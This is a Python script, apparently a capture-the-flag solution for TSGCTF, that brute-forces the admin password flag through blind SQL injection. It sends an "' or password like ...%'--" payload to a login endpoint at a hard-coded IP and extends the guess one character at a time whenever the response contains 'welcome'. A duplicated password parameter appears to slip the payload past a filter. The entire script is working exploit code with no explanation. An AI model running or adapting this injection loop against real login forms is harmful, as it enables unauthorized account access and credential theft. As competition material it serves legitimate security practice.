import requests
from urllib.parse import quote
import string

url = "http://35.221.67.248:10501/"

charset = string.digits + string.ascii_lowercase + "{}_"

flag = "TSGCTF{"

while not flag.endswith("}"):
    for char in charset:
        print("Trying:", char, '|', flag)

        payload = quote(f"' or password like '{flag}{char}%'--")
        res = requests.get(f"{url}/actions/login?name=admin&password={payload}&password=x")

        if "welcome" in res.text.lower():
            flag += char
            break

print("Flag:", flag)